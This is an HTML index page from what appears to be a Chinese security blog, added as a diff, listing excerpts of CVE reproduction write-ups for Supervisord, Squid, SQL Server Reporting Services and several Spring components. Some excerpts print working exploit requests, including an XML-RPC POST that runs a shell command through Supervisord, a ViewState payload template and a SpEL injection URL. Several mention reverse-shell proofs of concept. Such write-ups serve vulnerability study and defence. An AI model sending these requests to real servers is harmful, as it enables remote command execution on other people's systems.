@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/40/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Supervisord/（CVE-2017-11610）Supervisord 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Supervisord/%EF%BC%88CVE-2017-11610%EF%BC%89Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.221Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-11610）Supervisord-远程命令执行漏洞"><a href="#（CVE-2017-11610）Supervisord-远程命令执行漏洞" class="headerlink" title="（CVE-2017-11610）Supervisord 远程命令执行漏洞"></a>（CVE-2017-11610）Supervisord 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Supervisor是一套进程控制系统，用于监视和控制类Unix系统上的进程。XML-RPC<br>server是其中的一个XML-RPC服务器。<br>Supervisor中的XML-RPC服务器存在安全漏洞。远程攻击者可借助特制的XML-RPC请求利用该漏洞执行任意命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>supervisor<br>3.0.1之前的版本，3.1.4之前的3.1.x版本，3.2.4之前的3.2.x版本，3.3.3之前的3.3.x版本。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>直接执行任意命令：</p>
+<pre><code>POST /RPC2 HTTP/1.1
+Host: www.0-sec.org
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 213
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;
+&lt;string&gt;touch /tmp/success&lt;/string&gt;
+&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;
+</code></pre>
+<p><img src="/resource/(CVE-2017-11610)Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<h3 id="关于直接回显的POC"><a href="#关于直接回显的POC" class="headerlink" title="关于直接回显的POC"></a>关于直接回显的POC</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Supervisord/%EF%BC%88CVE-2017-11610%EF%BC%89Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Supervisord/%EF%BC%88CVE-2017-11610%EF%BC%89Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvz800hby8v1hgg2fw5y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Squid/（CVE-2019-18679）Squid 敏感信息泄漏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Squid/%EF%BC%88CVE-2019-18679%EF%BC%89Squid%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.194Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-18679）Squid-敏感信息泄漏"><a href="#（CVE-2019-18679）Squid-敏感信息泄漏" class="headerlink" title="（CVE-2019-18679）Squid 敏感信息泄漏"></a>（CVE-2019-18679）Squid 敏感信息泄漏</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Squid是一个开源的高性能的代理缓存服务器。它接受来自客户端的请求并适当地处理这些请求。例如，如果一个人想下载一web页面，他请求Squid为他取得这个页面。Squid随之连接到远程服务器并向这个页面发出请求。然后，Squid显式地聚集数据到客户端机器，而且同时复制一份。当下一次有人需要同一页面时，Squid可以简单地从磁盘中读到它，那样数据迅即就会传输到客户机上。当前的Squid可以处理HTTP，FTP，GOPHER，SSL和WAIS等协议。</p>
+<p>几个月之前，Synacktiv<br>teams对Squid的源码进行审计，发现了几个漏洞，其中一个是在Digest<br>authentication过程中触发的敏感信息泄漏漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞发生在fixHeader函数。nonce变量通过authenticateDigestNonceNew函数申请，authenticateDigestNonceNonceb64取出nonce变量的值，通过httpHeaderPutStrf发送给客户端。</p>
+<p><img src="/resource/(CVE-2019-18679)Squid%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/media/rId25.jpg" alt="15904903701.jpg">authenticateDigestNonceNonceb64函数单纯的取出了nonce-&gt;key的值，重点看下nonce变量和nonce-&gt;key的赋值过程。</p>
+<p><img src="/resource/(CVE-2019-18679)Squid%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/media/rId26.png" alt="2.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Squid/%EF%BC%88CVE-2019-18679%EF%BC%89Squid%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Squid/%EF%BC%88CVE-2019-18679%EF%BC%89Squid%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" data-id="cl5c2qvz800hcy8v1477uauo8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-SQL Server/（CVE-2020-0618）SQL Server 远程代码执行漏洞 " class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/SQL%20Server/%EF%BC%88CVE-2020-0618%EF%BC%89SQL%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.175Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-0618）SQL-Server-远程代码执行漏洞"><a href="#（CVE-2020-0618）SQL-Server-远程代码执行漏洞" class="headerlink" title="（CVE-2020-0618）SQL Server 远程代码执行漏洞"></a>（CVE-2020-0618）SQL Server 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞需要经过身份验证后，攻击者向 SQL Server 的报告服务(Reporting<br>Services) 发送特制请求进行触发。攻击成功可获得SQL<br>Server服务的对应控制权限。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>  产品                                   版本                         修复补丁编号</p>
+<hr>
+<p>  SQL Server 2016 Service Pack 2(GDR)    13.0.5026.0 - 13.0.5101.9    KB4505220<br>  SQL Server 2016 Service Pack 2 CU11    13.0.5149.0 - 13.0.5598.27   KB4527378<br>  SQL Server 2014 Service Pack 3 (GDR)   12.0.6024.0 - 12.0.6108.1    KB4505218<br>  Server 2014 Service Pack 2 CU4         12.0.6205.1 - 12.0.6329.1    KB4500181<br>  SQL Server 2012 Service Pack 4 (QFE)   11.0.7001.0 - 11.0.7462.6    KB4057116</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先登陆 ReportServer/pages/ReportViewer.aspx</p>
+<pre><code>POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1
+Host: target
+Content-Type: application/x-www-form-urlencoded
+Content-Length: X
+
+NavigationCorrector$PageState=NeedsCorrection&amp;NavigationCorrector$ViewState=[PayloadHere]&amp;__VIEWSTATE=
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/SQL%20Server/%EF%BC%88CVE-2020-0618%EF%BC%89SQL%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/SQL%20Server/%EF%BC%88CVE-2020-0618%EF%BC%89SQL%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20/" data-id="cl5c2qvy600hay8v14fs0hmdy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring WebFlow/（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20WebFlow/%EF%BC%88CVE-2017-4971%EF%BC%89Spring%20WebFlow%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.141Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-4971）Spring-WebFlow-远程代码执行漏洞"><a href="#（CVE-2017-4971）Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞"></a>（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Spring WebFlow<br>是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其<br>2.4.x<br>版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Web Flow 2.4.0版本至2.4.4版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先访问<code>http://www.0-sec.org:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：<img src="/resource/(CVE-2017-4971)SpringWebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png">然后访问id为1的酒店<code>http://www.0-sec.org/hotels/1</code>，点击预订按钮”Book<br>Hotel”，填写相关信息后点击”Process”（从这一步，其实WebFlow就正式开始了）：</p>
+<p><img src="/resource/(CVE-2017-4971)SpringWebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
+<p>再点击确认”Confirm”：</p>
+<p><img src="/resource/(CVE-2017-4971)SpringWebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png">此时抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20WebFlow/%EF%BC%88CVE-2017-4971%EF%BC%89Spring%20WebFlow%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20WebFlow/%EF%BC%88CVE-2017-4971%EF%BC%89Spring%20WebFlow%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvvt00h9y8v13wkh8usa" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Security Oauth/（CVE-2019-3778）Spring Security OAuth2 开放重定向" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.088Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-3778）Spring-Security-OAuth2-开放重定向"><a href="#（CVE-2019-3778）Spring-Security-OAuth2-开放重定向" class="headerlink" title="（CVE-2019-3778）Spring Security OAuth2 开放重定向"></a>（CVE-2019-3778）Spring Security OAuth2 开放重定向</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>限制条件：</p>
+<ul>
+<li><p>  有问题的Spring Security OAuth2版本</p>
+</li>
+<li><p>  oAuth认证使用授权码模式</p>
+</li>
+<li><p>  用户需要在登录的情况下</p>
+</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Security OAuth 2.3 to 2.3.4Spring Security OAuth 2.2 to 2.2.3Spring Security OAuth 2.1 to 2.1.3Spring Security OAuth 2.0 to 2.0.16</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。<br>只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p>
+<p>例如原始请求如下：</p>
+<pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" data-id="cl5c2qvvs00h8y8v19mfa11cf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Security Oauth/（CVE-2018-1260）Spring Security Oauth2 远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.085Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-1260）Spring-Security-Oauth2-远程代码执行"><a href="#（CVE-2018-1260）Spring-Security-Oauth2-远程代码执行" class="headerlink" title="（CVE-2018-1260）Spring Security Oauth2 远程代码执行"></a>（CVE-2018-1260）Spring Security Oauth2 远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先简要补充一下关于OAuth2.0的相关知识。<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId25.png" alt="1.png">以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access<br>token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。</p>
+<p>在获得access<br>token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization<br>code）、简化模式（implicit）、密码模式（resource owner password<br>credentials）、客户端模式（client<br>credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数<code>scope</code>，这个参数用于表示客户端申请的权限的范围。</p>
+<p>，根据<a target="_blank" rel="noopener" href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html">官方文档</a>，在spring-security-oauth的默认配置中scope参数默认为空：</p>
+<pre><code>scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope.
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" data-id="cl5c2qvvq00h7y8v1bgt367yq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Security Oauth/（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.083Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2016-4977）Spring-Security-OAuth2-远程命令执行漏洞"><a href="#（CVE-2016-4977）Spring-Security-OAuth2-远程命令执行漏洞" class="headerlink" title="（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞"></a>（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Spring Security OAuth 是为 Spring<br>框架提供安全认证支持的一个模块。在其使用 whitelabel views<br>来处理错误时，由于使用了Springs Expression Language<br>(SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Security OAuth 2.0.0版本至2.0.9版本Spring Security OAuth 1.0.0版本至1.0.5版本中</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>http://www.0-sec.org:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p>
+<p>可见，我们输入是SpEL表达式<code>$&#123;233*233&#125;</code>已经成功执行并返回结果：</p>
+<p><img src="/resource/(CVE-2016-4977)SpringSecurityOAuth2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>然后，我们使用poc.py来生成反弹shell的POC（注意：[Java反弹shell的限制与绕过方式要在这个网站进行转码]</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvvo00h6y8v1cfn5b5cz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Messaging/（CVE-2018-1270）Spring Messaging 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Messaging/%EF%BC%88CVE-2018-1270%EF%BC%89Spring%20Messaging%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.062Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-1270）Spring-Messaging-远程命令执行漏洞"><a href="#（CVE-2018-1270）Spring-Messaging-远程命令执行漏洞" class="headerlink" title="（CVE-2018-1270）Spring Messaging 远程命令执行漏洞"></a>（CVE-2018-1270）Spring Messaging 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>spring<br>messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，</p>
+<p>在spring<br>messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Java Framework &lt; 5.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring<br>messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。</p>
+<p>连接后端服务器的流程，可以理解为：</p>
+<ol>
+<li> 用<a target="_blank" rel="noopener" href="http://jmesnil.net/stomp-websocket/doc/">STOMP协议</a>将数据组合成一个文本流</li>
+<li> 用<a target="_blank" rel="noopener" href="https://github.com/sockjs/sockjs-client">sockjs协议</a>发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通信</li>
+</ol>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Messaging/%EF%BC%88CVE-2018-1270%EF%BC%89Spring%20Messaging%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Messaging/%EF%BC%88CVE-2018-1270%EF%BC%89Spring%20Messaging%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvvo00h5y8v113pse4cy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Data/（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Data/%EF%BC%88CVE-2018-1273%EF%BC%89Spring%20Data%20Commons%E7%BB%84%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.033Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
